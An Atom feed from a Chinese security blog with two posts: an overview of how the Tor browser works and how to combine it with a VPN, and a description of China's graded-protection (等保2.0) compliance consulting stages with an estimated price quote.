<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>madcoding’s blog</title>
  
  <subtitle>学习，沉淀，分享，交流</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://www.mad-coding.cn/"/>
  <updated>2019-10-28T08:31:39.138Z</updated>
  <id>https://www.mad-coding.cn/</id>
  
  <author>
    <name>madcoding</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>2019年Tor浏览器终极指南</title>
    <link href="https://www.mad-coding.cn/2019/10/25/2019%E5%B9%B4Tor%E6%B5%8F%E8%A7%88%E5%99%A8%E7%BB%88%E6%9E%81%E6%8C%87%E5%8D%97/"/>
    <id>https://www.mad-coding.cn/2019/10/25/2019年Tor浏览器终极指南/</id>
    <published>2019-10-25T08:36:56.000Z</published>
    <updated>2019-10-28T08:31:39.138Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>如果你想更了解Tor浏览器，那表示你已经知道<strong>在线隐私和匿名</strong>的重要性。因为Tor浏览器是帮助你保持在线安全的绝佳工具。但是关于它的优缺点，特别是<strong>关于它与VPN之间的关系</strong>，有很多人还一知半解。</p><a id="more"></a><h1 id="0x01-Tor浏览器是什么？"><a href="#0x01-Tor浏览器是什么？" class="headerlink" title="0x01 Tor浏览器是什么？"></a>0x01 Tor浏览器是什么？</h1><p>Tor浏览器在很多方面<strong>与普通的网络浏览器类似</strong>。易用性和Google Chrome或Microsoft Edge差不多。其不同之处在于Tor浏览器通过Tor网络将你连接到互联网。</p><p><strong>Tor是可以帮助你在线保持匿名的免费开源软件</strong>。当你使用Tor浏览器浏览互联网时，你的流量会在到达最终目的地之前通过服务器网络随机定向，以<strong>保护你的位置和身份安全</strong>。</p><p>“Tor”是“洋葱路由器（The Onion Router）”的缩写，反映Tor通过将数据<strong>包装在多个加密层</strong>中（如洋葱一般）来保护其数据的方式。</p><h1 id="0x02-Tor浏览器是VPN吗？"><a href="#0x02-Tor浏览器是VPN吗？" class="headerlink" title="0x02 Tor浏览器是VPN吗？"></a>0x02 Tor浏览器是VPN吗？</h1><p>Tor浏览器和VPN都是用来保护在线隐私的工具。然而，<strong>它们是两种不同的东西</strong>。其以截然不同的技术并<strong>以不同的方式来保护你</strong>的安全。</p><p>VPN将所有数据通过端到端加密以对其进行保护，再通过安全通道将其定向到远程服务器，而该服务器会再将你连接到你要访问的网站。</p><p>我们将在下面解释Tor浏览器如何以不同的方式保护你的隐私。</p><p>重要的是Tor浏览器与VPN不同，但<strong>你可以将这两个工具结合使用，以确保你的安全和隐私滴水不漏</strong>。</p><h1 id="0x03-Tor浏览器如何运作？"><a href="#0x03-Tor浏览器如何运作？" class="headerlink" title="0x03 Tor浏览器如何运作？"></a>0x03 Tor浏览器如何运作？</h1><p>尽管Tor浏览器的后台系统很复杂，但却非常容易使用。你只需<strong>下载并安装Tor浏览器</strong>，就可像使用任何其他浏览器一样<strong>连接到互联网</strong>。</p><p>Tor使用由美国海军开发来保护政府情报通信的独特系统。</p><p>你的数据将在进入Tor网络之前，被捆绑到加密数据包层中。然后<strong>通过一系列由志愿者操作的服务器（称为节点或中继）进行路由</strong>。</p><p>数据每通过一个中继，就会移除一层加密，以显示下一个中继的位置。<strong>当数据到达最终中继（称为“出口节点”）时，最后一层加密将被删除</strong>，而你的数据则会被发送到其最终目标地。</p><p>每个中继仅解密有助于了解前一个和下一个中继位置的数据。由于每个路径都是随机生成的，并且没有保留任何一个中继的记录，因此<strong>任何人都难以通过Tor的复杂网络追溯你的足迹</strong>。</p><h1 id="0x04-Tor浏览器安全吗？"><a href="#0x04-Tor浏览器安全吗？" class="headerlink" title="0x04 Tor浏览器安全吗？"></a>0x04 Tor浏览器安全吗？</h1><p>Tor浏览器可非常有效地<strong>隐藏你的位置并防止你的流量被跟踪</strong>，使任何人都难以通过Tor的网络追溯你的在线活动。</p><p>然而，<strong>Tor浏览器并不是没有漏洞</strong>。该系统有些缺点。由于Tor网络中的每个服务器都是<strong>由志愿者操作</strong>，因此你永远不知道数据传输的中继是由谁所有。</p><p>通常，因为<strong>每个中继 – 除了出口节点以外 – 只能获悉前一个和下一个中继的位置，</strong>因此这不成问题。</p><p>出口节点会删除数据的最后一层加密。你的原始位置或IP地址不会被看见，但如果你访问不安全的HTTP网站，则<strong>出口节点可能会借此监视你的活动</strong>。</p><p>此外，Tor浏览器<strong>也与其他浏览器一样容易受到类似的攻击</strong>。如果你想保持匿名，则最好关闭浏览器的插件和脚本，因为其可能会泄露你的IP地址等信息。</p><h1 id="0x05-Tor浏览器有哪些缺点？"><a href="#0x05-Tor浏览器有哪些缺点？" class="headerlink" title="0x05 Tor浏览器有哪些缺点？"></a>0x05 Tor浏览器有哪些缺点？</h1><p>使用Tor浏览器的最大缺点是速度。由于你的数据必须在到达最终目的地之前经过多个中继，因此你的<strong>浏览速度可能非常慢</strong>。</p><p>Tor浏览器不是流媒体和下载的最佳选择，而其创建者也<strong>强烈反对种子下载</strong>。使用Tor下载不仅慢，且下载流量没有受到保护，更可能因此暴露你的IP地址。</p><p>如果你正在寻找<strong>流媒体或下载的方式，则VPN将为你提供更好的保护</strong>。</p><p>使用Tor浏览器的另一个缺点是它可能<strong>让你的在线活动受到关注</strong>。你的互联网服务提供商（ISP）无法看到你正在进行的活动，但他们知到你正在使用Tor，进而对你正在从事的活动产生怀疑。</p><p>即使你只使用Tor浏览器来合法浏览互联网，连接Tor也<strong>可能使你成为政府监控的目标</strong>。像美国国家安全局和联邦调查局这样的美国政府机构都积极试图跟踪Tor用户的在线活动。</p><h1 id="0x06-Tor搭配VPN"><a href="#0x06-Tor搭配VPN" class="headerlink" title="0x06 Tor搭配VPN"></a>0x06 Tor搭配VPN</h1><p>Tor浏览器相当实用，但它不能提供VPN所提供的安全防护。幸运的是，你不必在两者之间做选择。<strong>你可以将Tor浏览器和VPN结合使用，以结合其功能并获得最佳隐私</strong>。</p><p>将Tor浏览器和VPN结合的方式<strong>主要有两种</strong>。我们将讲解这两种方法的流程并解释每种方法的优缺点。</p><h1 id="0x07-Tor-over-VPN"><a href="#0x07-Tor-over-VPN" class="headerlink" title="0x07 Tor over VPN"></a>0x07 Tor over VPN</h1><p>若要使用此方法，首先你必须连接到VPN，然后进入Tor网络。此方法有一些优点，其中包含易用性，因为你<strong>只需连接到VPN再打开Tor浏览器</strong>即可。</p><p>在大多数情况下，此配置可为你提供足够的安全性和隐私以保护你的安全。</p><p><strong>一些VPN通过提供内置的Tor服务使此过程变得更加容易</strong>，其中例如<a href="https://zh.vpnmentor.com/reviews/nordvpn/" target="_blank" rel="noopener">NordVPN</a>的Onion over VPN服务，即可让你在没有Tor浏览器的情况下连接到Tor。</p><p>NordVPN通过其安全的VPN服务器来路由你的流量，然后直接将流量路由至Tor网络。<strong>NordVPN服务可以保护你设备上的所有流量，而不仅仅是你的浏览器活动</strong>。</p><p>Tor over VPN的另一个好处是，你的所有数据在进入Tor网络之前，都将由VPN进行安全加密。因此，<strong>Tor的志愿者操作服务器将无法获取你真实的IP地址</strong>。</p><p>由于VPN会隐藏你的在线活动，因此<strong>你的ISP也将无法检测到你的Tor连接</strong>。</p><p>因为你的VPN提供商无法看到你在Tor网络中从事的活动，你可从而获得一层隐私。另一方面，如果你的VPN提供商记录你的活动日志，则<strong>Tor over VPN无法隐藏你的真实IP地址或你正在使用Tor的事实</strong>。</p><p>此方法的另一个缺点是它<strong>不能保护你免受恶意出口节点的攻击</strong>，因为你的流量在到达最终目的地时没有受到加密。</p><h1 id="0x08-VPN-over-Tor"><a href="#0x08-VPN-over-Tor" class="headerlink" title="0x08 VPN over Tor"></a>0x08 VPN over Tor</h1><p>使用此方法时，你首先必须连接到Tor网络，然后再连接到VPN。此过程比Tor over VPN<strong>更复杂</strong>，因为在大多数情况下，你必须<strong>手动配置VPN</strong>才能使用Tor。</p><p>VPN over Tor最大的好处是它可以<strong>保护你免受Tor出口节点的攻击</strong>。你的流量不会直接从出口节点转到最终目的地，而是从出口节点路由到安全的VPN服务器。</p><p>此配置因此<strong>非常适合用来传递敏感信息</strong>。</p><p>此方法的坏处是，<strong>你的ISP以及政府机构</strong>虽不能看见你的在线活动<strong>，却能查知你的Tor连接</strong>。</p><p>此方法还可以<strong>避免VPN提供商记录你的真实IP地址</strong>。然而，若你选择采用透明的无日志政策的VPN，便不用担心这个问题。</p><h1 id="0x09-结论"><a href="#0x09-结论" class="headerlink" title="0x09 结论"></a>0x09 结论</h1><p>尽管Tor浏览器有其缺陷，但仍可有效保护你的在线隐私。<strong>将Tor的匿名性与VPN的安全性和安全性相结合</strong>，更可以让你获得两全其美的服务。</p><p>如果你打算使用Tor浏览器，我们强烈建议你搭配使用VPN。</p><p><strong>VPN</strong>可在不显着降低Tor浏览器速度的前提下<strong>提供出色的安全性和匿名性</strong>。</p><p>如果你正在寻找值得信赖VPN来保护你的在线隐私，请查看我们的最佳<a href="https://zh.vpnmentor.com/blog/最優惠vpn及折扣代碼/" target="_blank" rel="noopener">VPN优惠和优惠券代码</a>列表。</p><p>洋葱路由使用教程：<a href="https://www.5xiaobo.com/?id=308" target="_blank" rel="noopener">https://www.5xiaobo.com/?id=308</a></p><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;如果你想更了解Tor浏览器，那表示你已经知道&lt;strong&gt;在线隐私和匿名&lt;/strong&gt;的重要性。因为Tor浏览器是帮助你保持在线安全的绝佳工具。但是关于它的优缺点，特别是&lt;strong&gt;关于它与VPN之间的关系&lt;/strong&gt;，有很多人还一知半解。&lt;/p&gt;
    
    </summary>
    
      <category term="安全工具" scheme="https://www.mad-coding.cn/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="tor浏览器" scheme="https://www.mad-coding.cn/tags/tor%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    
  </entry>
  
  <entry>
    <title>等保服务内容及报价</title>
    <link href="https://www.mad-coding.cn/2019/10/24/%E7%AD%89%E4%BF%9D%E6%9C%8D%E5%8A%A1%E5%86%85%E5%AE%B9%E5%8F%8A%E6%8A%A5%E4%BB%B7/"/>
    <id>https://www.mad-coding.cn/2019/10/24/等保服务内容及报价/</id>
    <published>2019-10-24T02:43:57.000Z</published>
    <updated>2019-10-24T06:41:26.459Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>随着等保2.0的到来，再一次掀起了网络安全的热潮，为了让大家更好的理解等级保护，决定整理此文，内容来自互联网搜集。</p><a id="more"></a><h1 id="0x01-信息安全等级保护服务流程及内容"><a href="#0x01-信息安全等级保护服务流程及内容" class="headerlink" title="0x01 信息安全等级保护服务流程及内容"></a>0x01 信息安全等级保护服务流程及内容</h1><p>信息安全等级保护服务分为定级<strong>备案咨询</strong>、<strong>安全建设规划</strong>、<strong>安全等级现状测评</strong>、<strong>信息系统安全整改咨询</strong>和<strong>信息安全等级测评</strong>五个阶段，各阶段工作内容如下：</p><ol><li><p>定级备案咨询阶段：通过定级对象分析、定级要素分析，初步确定系统保护等级，协助召开定级专家咨询会议，确定系统保护等级，协助撰写定级报告、协助联络公安机关，完成定级备案工作。</p></li><li><p>安全建设规划阶段：协助建设单位按照同步规划、同步建设、同步运行的原则，做好项目建设的安全规划。</p></li><li><p>安全等级现状测评阶段：详实调研业务系统，了解系统边界、功能、服务范围、涉及部门、重要程度，全面进行差距分析和脆弱性评估；找出不足之处和安全漏洞，为等级保护体系设计提供客观依据；将根据之前的项目成果，制定合理安全管理措施和技术措施，形成等级化的信息安全保障体系。</p></li><li><p>信息系统安全整改咨询阶段：依据脆弱性评估结果，弥补技术层面的安全漏洞；建立健全信息安全管理制度；根据前期信息安全保障体系设计方案，指导系统运维方落实相关安全保障措施。</p></li><li><p>信息安全等级测评阶段：实施等级测评，以满足国家信息安全监管的相关政策要求。</p></li></ol><p>等保服务在合同签订后1个月内完成项目的系统定级、安全建设规划。在系统建设完成后2周内完成安全评估差距分析、整改建议等工作。在系统整改完成后2周内完成信息安全等级测评工作，出具等保测评报告。</p><h1 id="0x02-定级备案咨询"><a href="#0x02-定级备案咨询" class="headerlink" title="0x02 定级备案咨询"></a>0x02 定级备案咨询</h1><h2 id="2-1-工作内容"><a href="#2-1-工作内容" class="headerlink" title="2.1 工作内容"></a>2.1 工作内容</h2><p>（1）系统梳理</p><p>网络拓扑调查：通过对系统网络拓扑结构的调查，确定各个网络安全域，分析网络拓扑结构安全。</p><p>资产信息调查：通过对资产信息的调查，确定系统中重要资产，比如服务器、核心交换机、边界防火墙、IDS等。</p><p>服务信息调查：通过对服务信息的调查，确定系统服务对象。</p><p>系统边界调查：通过对系统边界的调查，确定各子系统边界情况。</p><p>（2）定级对象分析</p><p>业务类型分析：通过对业务类型的分析，确定各系统的重要性。</p><p>管理机构分析：通对管理机构的分析，确定安全管理机构设置的合理性。</p><p>（3）定级要素分析</p><p>业务信息分析：通过以上调查与分析，明确业务信息（系统数据）被破坏后受侵害的客体（公民、法人和其他组织的合法权益，社会秩序、公共利益，国家安全）和侵害程度。</p><p>系统服务分析：通过以上调查与分析，明确系统被破坏或者中断服务后受侵害的客体（公民、法人和其他组织的合法权益，社会秩序、公共利益，国家安全）和侵害程度。</p><p>综合分析：通过对业务信息分析与系统服务分析，分别确定其安全等级确定等级：取业务信息安全等级与系统服务安全等级中最高的为整个系统安全等级。</p><p>（4）撰写定级报告</p><p>撰写定级报告：通过以上调查与分析，撰写系统定级报告，包括系统描述、业务信息安全保护等级的确定、系统服务安全保护等级的确定、整个系统安全保护等级的确定等。</p><p>（5）协助定级备案</p><p>协助填写备案表：协助业主完成系统安全等级保护备案表的填写。</p><p>协助评审审批：协助业主组织召开系统定级结果评审会，协助业主完成整个定级审批过程。</p><h2 id="2-2-交付成果"><a href="#2-2-交付成果" class="headerlink" title="2.2 交付成果"></a>2.2 交付成果</h2><p>信息系统安全等级保护定级报告</p><p>信息系统定级备案表</p><h1 id="0x03-安全建设规划"><a href="#0x03-安全建设规划" class="headerlink" title="0x03  安全建设规划"></a>0x03  安全建设规划</h1><h2 id="3-1-工作内容"><a href="#3-1-工作内容" class="headerlink" title="3.1 工作内容"></a>3.1 工作内容</h2><p>根据等级化安全保障体系的设计思路，等级保护的安全建设规划包括以下内容：</p><ol><li><p>安全域设计：根据系统定级情况，通过分析系统业务流程、功能模块，根据安全域划分原则设计系统安全域架构。通过安全域设计将系统分解为多个层次，为下一步安全保障体系框架设计提供基础框架。</p></li><li><p>确定安全域安全要求：参照国家相关等级保护安全要求，设计不同安全域的安全要求。通过安全域适用安全等级选择方法确定系统各区域等级，明确各安全域所需采用的安全指标。</p></li><li><p>安全保障体系方案设计：根据安全域框架，设计系统各个层次的安全保障体系框架以及具体方案。包括：各层次的安全保障体系框架形成系统整体的安全保障体系框架；物理安全、网络安全、服务器安全等安全技术设计，安全管理制度规划与设计。</p></li></ol><p>通过如上内容的规划，系统可以形成整体的等级化的安全保障体系，同时根据安全术建设和安全管理建设，保障系统整体的安全。</p><h2 id="3-2-交付成果"><a href="#3-2-交付成果" class="headerlink" title="3.2 交付成果"></a>3.2 交付成果</h2><p>信息系统安全等级保护建设规划方案</p><h1 id="0x04-安全等级现状测评"><a href="#0x04-安全等级现状测评" class="headerlink" title="0x04 安全等级现状测评"></a>0x04 安全等级现状测评</h1><p>为确保信息系统的安全保护措施符合相应安全等级的基本安全要求，需要实施安全等级现状测评，以提出合理、有效的安全整改建议，为信息系统制定信息安全规划和决策提供依据。</p><p>测评机构将指导系统运维方开展安全评估工作，简要了解系统现有安全保障措施与国家信息安全等级保护等级标准要求之间的差距，制定信息安全规划方案；同时检查系统在技术层面存在的脆弱性漏洞，为后续安全加固工作奠定基础。</p><h2 id="4-1-等级保护差距分析"><a href="#4-1-等级保护差距分析" class="headerlink" title="4.1 等级保护差距分析"></a>4.1 等级保护差距分析</h2><p>按照等级保护实施要求，信息系统应该具备相应等级的安全防护能力，部署相应的安全设备，制定相应的安全管理机构、制度、岗位等。</p><p>差距分析就是依据等级保护技术标准和管理规范，比较分析信息系统安全防护能力与等级要求之间的差距。为等级化体系设计提供依据。</p><h3 id="4-1-1-工作内容"><a href="#4-1-1-工作内容" class="headerlink" title="4.1.1 工作内容"></a>4.1.1 工作内容</h3><p>差距分析将从技术上的物理安全、网络安全、主机系统安全、应用安全和数据安全五个层面和管理上的安全管理机构、安全管理制度、人员安全管理、系统建设管理和系统运维管理等五个方面分别进行。具体内容为：</p><p>1、技术差距检测：</p><p>(1)物理安全：针对信息系统所处的物理环境即机房、线路、基础支撑设施等进行标准符合性识别。主要包含：物理位置选择、物理访问控制、防盗窃和防破</p><p>坏、防雷击、防火、防水和防潮、防静电、温湿度控制、电力供应、电磁防护等方面。</p><p>(2)网络安全：对评估工作范围内的网络与安全设备、网络架构进行网络安全符合性调查。主要包含：结构安全与网段划分、网络访问控制、网络安全审计、边界完整性检查、网络入侵防范、恶意代码防范、网络设备防护等方面。</p><p>(3)主机安全：评估信息系统的主机系统安全保障情况。主要包含：身份鉴别、访问控制、安全审计、系统保护、入侵防护、恶意代码防护、资源控制等方面。</p><p>(4)应用安全：对信息系统进行应用安全符合性调查。主要包含：身份鉴别、访问控制、安全审计、通信完整性、通信保密性、抗抵赖、软件容错、资源控制等方面。</p><p>(5)数据安全：评估信息系统的数据安全保障情况。主要检查系统的数据在采集、传输、处理和存储过程中的安全。</p><p>2、管理差距检测：</p><p>(1)安全管理制度:评估安全管理制度的制定、发布、评审和修订等情况。主要涉及安全主管人员、安全管理人员、各类其它人员、各类管理制度、各类操作规程文件等对象。</p><p>(2)安全管理机构:评估安全管理机构的组成情况和机构工作组织情况。主要涉及安全主管人员、安全管理人员、相关的文件资料和工作记录等对象。</p><p>(3)人员安全管理：评估机构人员安全控制方面的情况。主要涉及安全主管人员、人事管理人员、相关管理制度、相关工作记录等对象。</p><p>(4)系统建设管理：评估系统建设管理过程中的安全控制情况。主要涉及安全主管人员、系统建设负责人、各类管理制度、操作规程文件、执行过程记录等对象。</p><p>(5)系统运维管理：评估系统运维管理过程中的安全控制情况。主要涉及安全主管人员、安全管理人员、各类运维人员、各类管理制度、操作规程文件、执行过程记录等对象。</p><p>3、等级保护差距分析：</p><p>基于技术、管理层面的标准合规性检测结果，根据国家等级保护标准，结合行业规范，针对标准的每项具体要求，从微观角度展开，深入分析信息系统与相应等级要求之间的差距，并从宏观角度对计算环境、区域边界和通信网络等方面对单元检测的结果进行验证、分析和整体评价，确认信息系统的整体安全防护能力有无缺失，是否能够对抗相应等级的安全威胁，为安全规划设计提供依据。</p><h3 id="4-1-2-交付成果"><a href="#4-1-2-交付成果" class="headerlink" title="4.1.2 交付成果"></a>4.1.2 交付成果</h3><p>信息系统等级保护差距分析报告</p><h2 id="4-2-脆弱性检测"><a href="#4-2-脆弱性检测" class="headerlink" title="4.2 脆弱性检测"></a>4.2 脆弱性检测</h2><p>脆弱性（弱点）是指可能为许多目的所利用的系统某些方面，包括系统弱点、安全漏洞和实现的缺陷等。为识别和分析信息系统所存在的脆弱性，确认需要实施安全加固与调优的事项，将首先进行脆弱性检测工作，从网络层、主机层和应用层三个方面进行检测，本次脆弱性检测的主要内容是漏洞扫描和系统配置检查。</p><h3 id="4-2-1-工作内容"><a href="#4-2-1-工作内容" class="headerlink" title="4.2.1 工作内容"></a>4.2.1 工作内容</h3><p>系统脆弱性检测涉及三个层面工作内容，包含整体的网络架构分析，服务器、网络与安全设备的配置检查，以及漏洞扫描检测工作。具体内容如下：</p><p>1、网络架构分析：</p><p>进行网络架构分析的目的是查找需要对网络结构实施优化的事项，具体内容如下：；(1)网络现状识别：涉及应用系统和用户分布，安全；(2)网络安全分析：从网络的整体架构进行考虑，紧急；如下：</p><p>(1)网络现状识别：涉及应用系统和用户分布，安全域划分，区域边界之间所采取的访问控制措施，网络带宽需求及现状，对数据流向的安全控制，设备链路冗余设计，对网络带宽的管控措施，远程访问通信链路的加密，各区域内所采取的入侵检测，安全审计措施，网络出口所采取的入侵防范、病毒过滤、垃圾邮件过滤措施、终端用户接入认证等内容。</p><p>(2)网络安全分析：从网络的整体架构进行考虑，紧密结合业务应用现状，识别重要信息系统部署和用户所在网络区域的分布情况，分析网络设计布局的合理性，是否存在单点隐患，确认链路带宽是否满足业务要求，检查产品设备老化问题，确认设备性能是否满足要求，分析网络区域边界是否定义清晰，安全域划分是否合理，服务器、终端接入是否安全，各类安全设备的部署是否到位等。</p><p>2、设备配置检查：</p><p>检查系统相关服务器、交换机与安全设备的配置策略，具体内容如下：</p><p>(1)服务器手工检查：检查服务器操作系统、数据库和中间件的开放服务及端口、账户设置、文件权限设置、审计、共享资源、补丁更新和病毒防护等情况；</p><p>(2)网络设备手工检查：检测交换机或路由器的Vlan划分、路由表配置、访问控制列表ACL、IP和MAC地址绑定情况、设备登录认证方式、口令设置等配置项；</p><p>(3)安全设备手工检查：获取防火墙的访问控制策略、以透明还是路由方式部署、NAT地址转换、网络连接数限制等信息，检查入侵检测、安全审计设备的审计策略配置、特征库版本情况等。</p><p>3、漏洞扫描检测：</p><p>借助专业化漏洞检测工具，对检测范围内的交换机、路由器和服务器实施扫描，发现配置上存在的弱点，作为对手工检查工作所获取数据的补充，同时也是制定安全加固方案的重要依据。</p><h3 id="4-2-2-交付成果"><a href="#4-2-2-交付成果" class="headerlink" title="4.2.2 交付成果"></a>4.2.2 交付成果</h3><p>信息系统脆弱性评估报告</p><h2 id="4-3-渗透测试"><a href="#4-3-渗透测试" class="headerlink" title="4.3 渗透测试"></a>4.3 渗透测试</h2><p>通过模拟黑客对信息系统进行渗透测试，发现分析并验证其存在的主机安全漏洞、敏感信息泄露、SQL注入漏洞、XSS跨站脚本漏洞及弱口令等安全隐患，评估系统抗攻击能力，提出安全加固建议。</p><h3 id="4-3-1-工作内容"><a href="#4-3-1-工作内容" class="headerlink" title="4.3.1 工作内容"></a>4.3.1 工作内容</h3><p>针对信息系统的渗透测试将采取两种类型：</p><p>第一类型：互联网渗透测试，是通过互联网发起远程攻击，比其他类型的渗透测试更能说明漏洞的严重性；</p><p>第二类型：内网渗透测试，通过接入内部网络发起内部攻击，主要针对信息系统的后台管理系统进行测试。</p><h3 id="4-3-2-交付成果"><a href="#4-3-2-交付成果" class="headerlink" title="4.3.2 交付成果"></a>4.3.2 交付成果</h3><p>信息系统渗透测试报告</p><h2 id="4-4-源代码测评"><a href="#4-4-源代码测评" class="headerlink" title="4.4 源代码测评"></a>4.4 源代码测评</h2><p>源代码安全测试对所提供的源代码采用工具进行安全扫描，分析和软件安全风险管理，并给出安全问题审计结果，安全问题描述和推荐修复建议。</p><h3 id="4-4-1-工作内容"><a href="#4-4-1-工作内容" class="headerlink" title="4.4.1 工作内容"></a>4.4.1 工作内容</h3><p>依据CVE（Common Vulnerabilities &amp; Exposures）安全漏洞库、设备及软件厂商公布的漏洞，根据测试用例对信息系统的源代码进行安全扫描，对安全漏洞进行识别，给出整改建议</p><h3 id="4-4-2-交付成果"><a href="#4-4-2-交付成果" class="headerlink" title="4.4.2 交付成果"></a>4.4.2 交付成果</h3><p>信息系统源代码测试报告</p><h1 id="0x05-信息系统安全整改咨询"><a href="#0x05-信息系统安全整改咨询" class="headerlink" title="0x05 信息系统安全整改咨询"></a>0x05 信息系统安全整改咨询</h1><p>信息系统安全整改包含3方面工作内容：首先测评机构将指导系统运维方针对脆弱性检测和渗透测试所发现的技术层面的安全隐患进行整改，其次以等级保护对应等级的管理要求为依据建立健全信息安全管理制度，最后依照信息系统安全规划方案指导信息系统优化和完善信息系统安全防护措施，并对系统安全整改情况进行跟踪和效果评价，为后续开展的等级测评工作奠定良好基础。</p><h2 id="5-1-安全加固与优化"><a href="#5-1-安全加固与优化" class="headerlink" title="5.1 安全加固与优化"></a>5.1 安全加固与优化</h2><p>根据前期脆弱性评估、渗透测试结果，结合信息系统的业务需求，对信息系统相关设备进行安全策略加强、调优等，加强网络、系统和设备抵御攻击和威胁的能力，整体提高网络安全防护水平。</p><h3 id="5-1-1-工作内容"><a href="#5-1-1-工作内容" class="headerlink" title="5.1.1 工作内容"></a>5.1.1 工作内容</h3><p>根据前期对信息系统进行的调研、评估与测评结果，以脆弱性评估报告和渗透测试报告为依据，根据网络安全特殊需求和业务流程制定安全加固方案，在不影响当前业务开展的前提下，对信息系统内的操作系统、数据库、安全设备以及中间件的安全配置策略进行加强，及时消除因安全漏洞被恶意攻击者利用从而引发的风险。</p><p>根据信息系统网络现状，本次项目安全加固对象分为四类，即信息系统内的操作系统、数据库、中间件以及网络与安全设备。</p><h3 id="5-1-2-交付成果"><a href="#5-1-2-交付成果" class="headerlink" title="5.1.2 交付成果"></a>5.1.2 交付成果</h3><p>信息系统安全加固与优化方案</p><h2 id="5-2-等级保护制度建设"><a href="#5-2-等级保护制度建设" class="headerlink" title="5.2 等级保护制度建设"></a>5.2 等级保护制度建设</h2><p> 以等级保护差距分析结果为依据，依照安全保障体系设计所提及的建设内容，按照等级保护标准要求，制定等级保护管理体系框架，明确管理方针、策略，以及相应的规定、操作规程、业务流程和记录表单；测评机构从结合信息系统实际业务流程的原则出发，指导系统运维方按照等级保护对应等级的管理标准，编写管理制度文件，并进行反复沟通和修订，确保所制定的文件的适用性，且满足各系统相应保护等级的安全管理要求。</p><h3 id="5-2-1-工作内容"><a href="#5-2-1-工作内容" class="headerlink" title="5.2.1 工作内容"></a>5.2.1 工作内容</h3><p>制定和完善与信息系统的安全保护等级相适应的配套管理制度，制度相关内容如下：</p><p>(1)安全管理机构：加强和完善安全机构的建设，设立指导和管理信息安全工作的信息安全领导小组，设立安全主管、安全管理各个方面的负责人，明确定义各个工作岗位的职责。建立各种安全管理活动的审批程序，明确对内对外的沟通协作方式，建立对各项安全管理活动的监督审核机制。</p><p>(2)安全管理制度：在差距分析的基础上，建立信息安全工作总体方针、安全策略，以方针策略为依据建立配套的安全管理制度及流程规范，由专门的组织机构负责管理制度的制订、发布和贯彻落实。定期对制度进行评审和修订，确保管理制度的适用性。</p><p>(3)人员安全管理：主要涉及两方面，对内部人员的安全管理和对外部人员的安全管理。具体包括人员录用、人员离岗、人员考核、安全意识教育和培训和外部人员访问管理等方面。</p><p>(4)系统建设管理：为了建设符合安全等级保护要求的信息系统、系统建设管理主要关注的是信息系统生命周期中的前三个阶段（即设计、采购、实施）中各</p><p>项安全管理活动，实现信息系统的安全管理贯穿系统的整个生命周期。系统建设管理分别从工程实施建设前、建设过程以及建设完毕交付等三方面考虑，具体包括系统定级、安全方案设计、产品采购和使用、自行软件开发、外包软件开发、工程实施、测试验收、系统交付、系统备案、等级测评和安全服务商选择等方面。</p><p>(5)系统运维管理：系统运行涉及到很多管理方面，要保证系统始终处于相应安全保护等级的安全状态中。要监控系统发生的重大变化，以便修改对应的安全措施。系统运维管理主要包括环境管理、资产管理、介质管理、设备管理、监控管理和安全管理中心、网络安全管理、系统安全管理、恶意代码防范管理、密码管理、变更管理、备份与恢复管理、安全事件处置、应急预案管理等方面。</p><h3 id="5-2-2-交付成果"><a href="#5-2-2-交付成果" class="headerlink" title="5.2.2 交付成果"></a>5.2.2 交付成果</h3><p>信息系统安全管理制度</p><h1 id="0x06-信息安全等级测评"><a href="#0x06-信息安全等级测评" class="headerlink" title="0x06 信息安全等级测评"></a>0x06 信息安全等级测评</h1><p>信息系统安全等级测评是测评机构依据国家信息安全等级保护制度规定，按照有关管理规范和技术标准，对非涉及国家秘密信息系统安全等级保护状况进行检测评估的活动。信息系统安全等级测评主要检测和评估信息系统在安全技术、安全管理等方面是否符合已确定的安全等级的要求；对于尚未符合要求的信息系统，分析和评估其潜在威胁、薄弱环节以及现有安全防护措施，综合考虑信息系统的重要性和面临的安全威胁等因素，提出相应的整改建议，并在系统整改后进行复测确认，以确保整改措施符合相应安全等级的基本要求。</p><h2 id="6-1-测评内容"><a href="#6-1-测评内容" class="headerlink" title="6.1 测评内容"></a>6.1 测评内容</h2><p>针对信息系统的安全等级测评的内容如下：</p><p>(1)按照《信息系统安全等级保护测评要求》，从以下方面进行等级测评：</p><p>技术安全测评：包括物理安全、网络安全、主机安全、数据安全、应用安全；</p><p>管理安全测评：包括安全管理制度、安全管理机构、人员安全管理、系统建设管理、系统运维管理；</p><p>综合测评：包括安全控制间安全测评、层面间安全测评、区域间安全测评、系统结构安全测评。</p><p>(2)对每个保护类的子项给出测评结果并分别提出改进建议；</p><p>(3)按照整改结果进行复测，出具等级测评报告。</p><h2 id="6-2-交付成果"><a href="#6-2-交付成果" class="headerlink" title="6.2 交付成果"></a>6.2 交付成果</h2><p>信息系统等级测评报告</p><h1 id="0x07-信息安全等级保护服务报价"><a href="#0x07-信息安全等级保护服务报价" class="headerlink" title="0x07 信息安全等级保护服务报价"></a>0x07 信息安全等级保护服务报价</h1><p>等级保护按照运行的业务进行定级，不同业务可以定不同保护等级，根据基础网络、管理制度复用原则进行多个业务系统报价（三级、二级系统报价明细见附件）。</p><p>按照10个业务系统计算，进行定级备案、建设规划、安全测评、整改咨询、等级测评报告等5项服务，预估报价如下：</p><p>10个三级系统：</p><p>预估总价=34.78+9×3.55=66.73万元10个二级系统：</p><p>预估总价=20.77+9×2.1=39.67万元5个三级系统5个二级系统：</p><p>预估总价=34.78+4×3.55+5×2.1=59.48万元</p><p>### </p><hr>]]></content>
    
    <summary type="html">
    
